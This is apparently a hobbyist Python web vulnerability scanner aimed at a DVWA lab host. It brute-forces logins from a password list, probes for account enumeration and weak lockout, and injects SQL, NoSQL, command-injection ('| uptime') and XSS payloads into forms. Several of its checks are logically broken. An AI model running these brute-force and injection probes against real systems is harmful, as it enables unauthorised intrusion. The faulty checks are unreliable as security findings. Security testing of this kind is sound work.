#!usr/bin/env python

import requests
import re
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup
import os
import queue
import socket
import ssl
from datetime import datetime


headers = {
    "Strict-Transport-Security": 0,
    "X-Frame-Options": 1,
    "X-Content-Type-Options": 2,
    "Content-Security-Policy": 3,
    "X-Permitted-Cross-Domain-Policies": 4,
    "Referrer-Policy": 5,
    "Clear-Site-Data": 6,
    "Cross-Origin-Embedder-Policy": 7,
    "Cross-Origin-Opener-Policy": 8,
    "Cross-Origin-Resource-Policy": 9
}
headers_list = [[], [], [], [], [], [], [], [], [], []]
legacy_versions = ["sslv2", "sslv3", "tlsv1.0", "freak", "null", "nomore", "crime", "logjam"]
server_list = set()


class LoginPageTests:
    def __init__(self, user, login_url, pass_file, wrong_username, good_password, certain_wrong_passwd, logout_url):
        self.username = user
        self.password_found = False
        self.login_url = login_url
        self.logged_in = False
        self.pass_file = pass_file
        self.password = None
        self.wrong_un = wrong_username
        self.wrong_passwords = [certain_wrong_passwd]
        self.credentials_error_vuln = False
        self.good_password = good_password
        self.session = requests.session()
        self.logout_url = logout_url
        self.not_triggered = False
        # self.basic_auth_http()
        for i in range(2, 4):
            self.check_login_attempts(i)
            if self.not_triggered:
                print("\n[!!!!!-!!!!!] Weak Lockout mechanism found for invalid password attempts. Current attempts: ", i+1)
        else:
            print("\n[~~] Creating Password List Queue. This might take a while depending on the size of the password file...\n")

        with open(pass_file, "rb") as f:
            pass_list = f.readlines()
            f.close()
        pass_q = queue.Queue()
        if len(pass_list):
            for passwd in pass_list:
                try:
                    passwd = passwd.decode("utf-8").rstrip()
                    pass_q.put(passwd)
                except Exception:
                    passwd = passwd.decode("latin-1").rstrip()
                    pass_q.put(passwd)
        for pass_word in pass_q.queue:
            password = pass_word
            http = requests.post(self.login_url, data={'username': self.username, 'password': password, 'Login': 'submit'})
            if http.url == 'http://192.168.108.143/dvwa/index.php':  # change to var
                print("\n\n[!!!!---!!!!] BruteForce Attack Successful!!" + "\nUsername: " + self.username + "\n" + "FOUND PASSWORD: " + password + "\n\n")
                self.password = password
                self.password_found = True
                break
            else:  # certain wrong password
                self.wrong_passwords.append(password)

        print("\nChecking for Account Enumeration and Possible Guessable Users...")
        wrong_password_req = requests.post(self.login_url, data={'username': self.username, 'password': self.wrong_passwords[0], 'Login': 'submit'})
        wrong_password_req_content = str(wrong_password_req.content)
        if self.password_found:
            wrong_username_req = requests.post(self.login_url, data={'username': self.wrong_un, 'password': self.password, 'Login': 'submit'})
            wrong_username_req_content = str(wrong_username_req.content)
            if wrong_username_req_content != wrong_password_req_content:
                print("\n[!!!!!-!!!!!!] It s possible that the login error message provides useful information about login credentials! Make sure the error message is the same for any invalid credentials case!")
                self.credentials_error_vuln = True
        elif not self.password_found:
            wrong_username_req = requests.post(self.login_url, data={'username': self.wrong_un, 'password': self.good_password, 'Login': 'submit'})
            wrong_username_req_content = str(wrong_username_req.content)
            if wrong_username_req_content != wrong_password_req_content:
                print(
                    "\n[!!!!!-!!!!!!] It s possible that the login error message provides useful information about login credentials! Make sure the error message is the same for any invalid credentials case!")
                self.credentials_error_vuln = True
        if not self.credentials_error_vuln:
            print("\n[OK] No account enumeration vulnerability found!")

    def get_correct_password(self):
        if self.password_found:
            return self.password
        return False

    def check_login_attempts(self, n):
        self.triggered = False
        self.session = requests.session()
        for i in range(n):
            self.session.post(self.login_url, data={'username': self.username, 'password': self.wrong_passwords[0], 'Login': 'submit'})
        correct_login = self.session.post(self.login_url, data={'username': self.username, 'password': self.good_password, 'Login': 'submit'})
        if correct_login.url == 'http://192.168.108.143/dvwa/index.php':  # change to var
            self.session.post(self.logout_url)
            self.session.close()
            print("\n[!!!!-!!!!] Wrong Password Lock Out Mechanism not triggered after " + str(n+1) + " times")
            self.not_triggered = True

    # def basic_auth_http(self):
        # login_headers = self.session.get(self.login_url).headers


class Scanner:
    def __init__(self, url, ignored_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.ignored_links = ignored_links
        self.cookie_list = []
        self.visited = []
    # Utilities ---------@

    def extract_links_from(self, url):
        response = self.session.get(url)
        return re.findall('(?:href=")(.*?)"', str(response.content))

    def crawl(self, url=None):
        if url is None:
            url = self.target_url
        href_links = self.extract_links_from(str(url))
        for link in href_links:
            link = urllib.parse.urljoin(url, link)

            if "#" in link:
                link = link.split("#")[0]

            if self.target_url in link and link not in self.target_links and link not in self.ignored_links:
                self.target_links.append(link)
                self.crawl(link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, "html.parser")
        return parsed_html.findAll("form")

    def check_response(self, url):
        if self.session.post(url).status_code == 200:
            return True
        elif self.session.get(url).status_code == 200:
            return True
        return False

    def submit_form(self, form, value, url, files=None):
        action = form.get("action")
        post_url = urllib.parse.urljoin(url, action)
        method = form.get("method")
        inputs_list = form.findAll("input")
        post_data_dict = {}
        for inputs in inputs_list:
            input_name = inputs.get("name")
            input_type = inputs.get("type")
            input_value = inputs.get("value")

            if input_type == "text":
                input_value = value
            post_data_dict[input_name] = input_value
        if method.lower() == "post":
            return self.session.post(post_url, files=files, data=post_data_dict)
        return self.session.get(post_url, params=post_data_dict)

    def save_cookies(self, url):
        self.session.get(url)
        session_cookies = self.session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def check_hidden_path(self, path):
        response = self.session.get(self.target_url + path)
        if response == 200:
            return True
        return False

    def get_headers(self, link):
        return self.session.get(link).headers

# Get Info
    def fingerprint(self, url):
        global server_list
        header_for_link = self.get_headers(url)
        server_list.add(header_for_link["Server"])

# Vulnerabilities

    # INJECTIONS----@

    def test_sql(self, form, url):
        sql_no_payload = ""
        response_wh_payload = self.submit_form(form, sql_no_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        sql_detect_payload = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'*/"
        # detectify https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
        response_w_payload = self.submit_form(form, sql_detect_payload, url)
        sql_response_time = response_w_payload.elapsed.total_seconds()
        if sql_response_time > normal_response_time and sql_response_time > 1:
            print("\nExpected seconds to load: " + str(normal_response_time))
            print("\nGot: " + str(sql_response_time) + "\n")
            # print("\nResponse Header: " + str(response_w_payload.headers))
            return True
        return False

    def test_nosql(self, form, url):
        no_nosql_payload = ""
        response_wh_payload = self.submit_form(form, no_nosql_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        nosql_detect_payload = "';sleep(5000); ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"
        # https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/
        response_w_payload = self.submit_form(form, nosql_detect_payload, url)
        nosql_response_time = response_w_payload.elapsed.total_seconds()
        if nosql_response_time > normal_response_time and nosql_response_time > 1:
            print("\nExpected seconds to load: " + str(normal_response_time))
            print("\nGot: " + str(nosql_response_time) + "\n")
            # print("\nResponse Header: " + str(response_w_payload.headers))
            return True
        return False

    def code_exec(self, form, url):
        code_exec_script = "| uptime"
        response = self.submit_form(form, code_exec_script, url)
        return re.findall('\d\d:\d\d:\d\d', str(response.content))

    # Broken Authentication-------------@
    # Above Class(LoginTestsVulns)
    def test_role_definition_cookie(self, url):
        cookie_dict = self.save_cookies(url)
        if "isadmin" in str(cookie_dict).lower():
            if str(cookie_dict.lower()["isAdmin"]).lower() == "true" or str(cookie_dict.lower()["isAdministrator"]).lower() == "true" or str(cookie_dict.lower()["admin"]).lower() == "true" or str(cookie_dict.lower()["administrator"]).lower() == "true":
                return True
        if "role" in str(cookie_dict).lower():
            if str(cookie_dict.lower()["role"]).lower() == "admin" or str(cookie_dict.lower()["role"]).lower() == "administrator" or str(cookie_dict.lower()["role"]).lower() == "manager" or str(cookie_dict.lower()["role"]).lower() == "auditor" or str(cookie_dict.lower()["role"]).lower() == "mod":
                return True
        return False

    def search_paths(self):
        print("\nPossible Hidden Paths Found:\n")
        with open("path_dict.txt", "r") as file:
            paths = file.read().split("\n")
        for path in paths:
            try:
                if self.target_url + path not in self.visited and self.target_url + path not in self.ignored_links and self.target_url + path not in self.target_links and "logout" not in self.target_url + path:
                    response = self.session.get(self.target_url + path)
                    if response.status_code == 200:
                        print(self.target_url + path)
                        link_visited = self.target_url + path
                        self.visited.append(str(link_visited))
            except Exception:
                # print(e)
                continue
        print("\nFinished searching for paths!\n")

    def test_role_definition_directories(self):
        hidden_dir = []
        for link in self.visited:
            link = link.lower()
            if "/admin" in link or "/administrator" in link or "/mod" in link or "/moderator" in link:
                hidden_dir.append(link)
        if hidden_dir:
            return hidden_dir
        return False

    def check_session_url(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid=" or "sessionid=" in str(url).lower():
            print("\n[?????-!!!!!]Possible SessionID Hijacking for link:" + url)
            print("\nSearching for proper SessionID storage on cookies...")
            if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
                if not str(cookie_dict.lower()["secure"]) or str(cookie_dict.lower()["httpOnly"]):
                    print("\n[!!!!!-!!!!!!]Cookie Session not secure...(HTTP only)")
                    return True
        return False

    def test_browser_cache_weakness(self, url):
        response = self.session.get(url)
        if "Cache-Control" in str(response.headers):
            if (response.headers["Cache-Control"] != "no-store" and response.headers["Cache-Control"] == "no-cache, must-revalidate") or (response.headers["Cache-Control"] == "no-store" and response.headers["Cache-Control"] != "no-cache, must-revalidate"):
                return False
        return True

    # Sensitive Data Exposure
    # checking certificate...
    def check_tls(self, to_check=None):
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target_url, 443)) as sockk:
                with context.wrap_socket(sockk, server_hostname=self.target_url) as tlssock:
                    y = getattr(tlssock, to_check)
                    return y()
        except Exception as e:
            print("\nSomething went wrong in checking TLS. Error: ", str(e))
            pass

    def check_tls_version(self):
        print("\nChecking TLS extensions version...")
        try:
            version = self.check_tls("version")
            if version:
                found = True
            else:
                found = False
            for legacy in legacy_versions:
                if str(version).lower() == legacy:
                    print(version.lower)
                    print(
                        "\n[!!!!-!!!!] Found Legacy Version for TLS extension, this version contains cryptographic weaknesses: " + str(
                            version))
            if not found:
                print("\n[!!!-!!!] Cannot find the version of the TLS extension...")
        except Exception as e:
            print("\n[!!!-!!!] Cannot find the version of the TLS extension. Error: ", e)
            pass

    def check_tls_validity(self):
        try:
            print("\nChecking Validity of Digital Certificate...")
            sep = " "
            stripped = self.check_tls("getpeercert")["notAfter"].split(sep, -1)[:-1]
            str1 = " "
            good_date = str1.join(stripped)
            date_time_obj = datetime.strptime(good_date, '%b %d %H:%M:%S %Y')
            print("\nCertificate expires in: ", date_time_obj-datetime.today())
        except Exception as e:
            print("\n[!!!-!!!] Cannot find validity for the TLS extension. Error: ", e)
            pass

    def check_secure_tag_cookie_sessid(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
            if "secure" or not "httponly" not in str(cookie_dict).lower() or not "secure" and not "httponly" in str(cookie_dict).lower():
                return True
        return False

    @staticmethod
    def check_form_action(form):
        action = form.get("action")
        if "http" in action and "https" not in action:
            return True
        return False

    def test_xss_in_link(self, url):
        xss_test_script = "<sCript>alert('test')</sCRiPt>"
        url = url.replace("=", "=" + xss_test_script)
        response = self.session.get(url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    def test_xss_in_form(self, form, url):
        xss_test_script = "<sCript>alert('test')</sCRiPt>"
        response = self.submit_form(form, xss_test_script, url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    @staticmethod
    def create_file_dir(subdir):
        filenames = ["filefortest.php", "fIleForTest.Php.JpEG", "fiL3ForTest.hTMl.JPG"]
        here = os.path.dirname(os.path.realpath(__file__))
        if not os.path.exists(os.path.join(here, subdir)):
            os.mkdir(os.path.join(here, subdir))
        for filename in filenames:
            if not os.path.isfile("./" + filename):
                filepath = os.path.join(here, subdir, filename)
                test_file = open(filepath, 'w+')
                test_file.write("This is unharmful content to be uploaded to the site")
                test_file.close()

    def file_upload(self, form, url):
        is_file = False
        inputs_list = form.find_all("input")
        for inputs in inputs_list:
            if inputs.get("type") == "file":
                is_file = True
        if is_file is True:
            self.create_file_dir("Files")
            cur_path = os.path.join(os.path.dirname(__file__), 'Files')
            dir_listing = os.listdir(cur_path)
            os.chdir(cur_path)
            for i in dir_listing:
                path_for_file = os.path.relpath('..\\Files\\' + i, cur_path)
                f = open(path_for_file, 'rb')
                files = {'uploaded': f}
                if self.submit_form(form, "value", url, files).status_code == 200:
                    return True
            return False

    # def intercept_headers(self, url):
    #     header = interceptor.Interceptor(url)
    #     header.need_intercept("new", "new")

    def local_file_inclusion(self, url):
        lfi_script = "~"
        url = url.replace("=", "=" + lfi_script)
        if self.check_response(url):
            return True
        return False

    def insecure_headers(self, url):

        global headers
        global headers_list
        response = self.session.get(url)

        if "strict-transport-security" in str(response.headers).lower():
            headers_list[headers['Strict-Transport-Security']].append(url)

        elif "x-frame-options" in str(response.headers).lower():
            headers_list[headers['X-Frame-Options']].append(url)

        elif "x-content-type-options" in str(response.headers).lower():
            headers_list[headers['X-Content-Type-Options']].append(url)

        elif "content-security-policy" in str(response.headers).lower():
            headers_list[headers['Content-Security-Policy']].append(url)

        elif "x-permitted-cross-domain-policies" in str(response.headers).lower():
            headers_list[headers['X-Permitted-Cross-Domain-Policies']].append(url)

        elif "referrer-policy" in str(response.headers).lower():
            headers_list[headers['Referrer-Policy']].append(url)

        elif "clear-site-data" in str(response.headers).lower():
            headers_list[headers['Clear-Site-Data']].append(url)

        elif "cross-origin-embedder-policy" in str(response.headers).lower():
            headers_list[headers['Cross-Origin-Embedder-Policy']].append(url)

        elif "cross-origin-opener-policy" in str(response.headers).lower():
            headers_list[headers['Cross-Origin-Opener-Policy']].append(url)

    def run_scanner(self):
        session_id = ""
        prev_session_id = ""
        potential_role_definition = False
        links_vulnerable_to_lfi = []
        links_without_secure_cookie_with_sessid = []
        browser_cache_weakness_links = []
        self.crawl()
        self.search_paths()
        # role def admin dir
        has_admin_directories = self.test_role_definition_directories()
        if has_admin_directories:
            for link in has_admin_directories:
                print("\n[!!!!---?????] Possible Admin Path discovered for link: ", link)
        # all link in web app
        visible_links = len(self.target_links)
        invisible_links_length = len(self.visited)
        print("\n\nTarget Links Length: ", visible_links, ". Visited Links Length: ", invisible_links_length)
        final_list = self.target_links + self.visited

        # checking tls version
        self.check_tls_version()
        # check validity
        self.check_tls_validity()

        print("\n[?!?!?!?!--?!?!?!?!?!] Testing now for NOT HIDDEN links...")
        for count, link in enumerate(final_list):
            try:
                if count-1 == visible_links:
                    print("\n[?!?!?!?!--?!?!?!?!?!] Testing now for HIDDEN links...\n")
                self.insecure_headers(link)
                forms = self.extract_forms(link)

                potential_role_definition = self.test_role_definition_cookie(link)
                if potential_role_definition:
                    print("\n\n[!!!!---?????] Possible Role Definition Vulnerability on Cookies for link: " + str(link))
                # FingerPrint Web Server
                self.fingerprint(link)

                for form in forms:
                    print("[+] Testing form in " + link)
                    is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                    if is_vulnerable_to_xss:
                        print("\n\n[!!!!--!!!!] XSS Vulnerability discovered: " + str(link) + ". Following form vulnerable: \n" + str(form) + "\n\n")

                    is_vulnerable_to_file_upload = self.file_upload(form, link)
                    if is_vulnerable_to_file_upload:
                        print("\n\n[!!!!---!!!!] File Upload Vulnerability on: " + str(link) + " on form \n" + str(form) + "\n\n")

                    is_vulnerable_to_code_exec = self.code_exec(form, link)
                    if is_vulnerable_to_code_exec:
                        print("\n\n[!!!!---!!!!] Code Execution Vulnerability on: " + str(link) + " on form \n" + str(form) + "\n\n")

                    is_vulnerable_to_sql_injection = self.test_sql(form, link)
                    if is_vulnerable_to_sql_injection:
                        print("\n\n[!!!!---?????] Possible SQL Injection Vulnerability on: " + str(link) + " on form \n" + str(form) + "\n\n")

                    is_vulnerable_to_nosql_injection = self.test_nosql(form, link)
                    if is_vulnerable_to_nosql_injection:
                        print("\n\n[!!!!---?????] Possible NOSQL Injection Vulnerability on: " + str(
                            link) + " on form \n" + str(form) + "\n\n")

                    sensitive_over_form = self.check_form_action(form)
                    if sensitive_over_form:
                        print("\n\n[!!!!---?????] Sensitive Information might be transferred over unsecure form: " + str(
                            link) + "\n Form: \n" + str(form) + "\n\n")

                browser_cache_weakness = self.test_browser_cache_weakness(link)
                if browser_cache_weakness:
                    browser_cache_weakness_links.append(link)

                session_not_secure_in_cookie = self.check_secure_tag_cookie_sessid(link)
                if session_not_secure_in_cookie:
                    links_without_secure_cookie_with_sessid.append(link)

                if "=" in link:
                    print("[+] Testing " + link)
                    is_vulnerable_to_xss = self.test_xss_in_link(link)
                    if is_vulnerable_to_xss:
                        print("\n\n[!!!!---!!!!] XSS discovered: " + str(link) + "\n\n")

                    is_vulnerable_to_lfi = self.local_file_inclusion(link)
                    if is_vulnerable_to_lfi:
                        links_vulnerable_to_lfi.append(link)

                    if "sid=" in str(link).lower():
                        session_id = link.split("sid=", 1)[1]
                    elif "sessionid=" in str(link).lower():
                        session_id = link.split("sessionid=", 1)[1]
                    if session_id != prev_session_id:
                        if self.check_session_url(link):
                            prev_session_id = session_id
                            print("\n[!!!!!!-!!!!!!]SessionID Hijack Vulnerability found")
            except Exception as e:
                print(e)
                continue

        if not potential_role_definition:
            print("\n\n[!!!!---?????] Possible non-existing cookies with role storage...")

        if links_without_secure_cookie_with_sessid:
            print("\n[!!!!---!!!!] Session ID Set in Cookie but cookie is not secure. It can be sent over unencrypted channels (HTTP) Links:\n")
            print(*links_without_secure_cookie_with_sessid, sep="\n")
            print("\n End of Insecure Cookie With Session ID SET\n")

        if browser_cache_weakness_links:
            print("\n[!!!!---!!!!] Browser Cache Weakness Vulnerability on links:\n")
            print(*browser_cache_weakness_links, sep="\n")
            print("\n End of Browser Cache Weakness Vulnerability\n")

        if links_vulnerable_to_lfi:
            print("\n[!!!!---!!!!] Local File Inclusion Vulnerability on links:\n")
            print(*links_vulnerable_to_lfi, sep="\n")
            print("\n End of Local File Inclusion\n")

        if server_list:
            print("\nServer/s Found: ")
            print(*server_list, sep="\n")

        for xs in headers_list:
            if bool(xs):
                print(" ".join(map(str, xs)))
